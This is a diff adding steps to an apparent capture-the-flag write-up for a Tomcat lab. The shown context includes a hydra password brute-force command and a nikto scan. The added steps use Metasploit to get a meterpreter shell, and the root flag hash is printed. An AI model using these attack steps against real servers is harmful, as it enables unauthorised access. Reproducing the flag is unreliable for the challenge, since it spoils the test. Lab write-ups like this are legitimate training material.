@@ -112,6 +112,33 @@ command used: hydra -l bob -P rockyou.txt -f http-get <ip> -t 4 /protected/
 
 now according to the given task scanning /manager/html with nikto
 nikto -h http://10.10.131.147:1234/manager/html -id bob:<password>
+ 
+
+
+
+
+open msfconsole
+search tomcat
+you will find some payloads
+enter httpusername,httppassword,rhosts,rport
+then run it will open a meterpreter shell 
+where you will find the root flag
+ff1fc4a81affcc7688cf89ae7dc6e0e1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
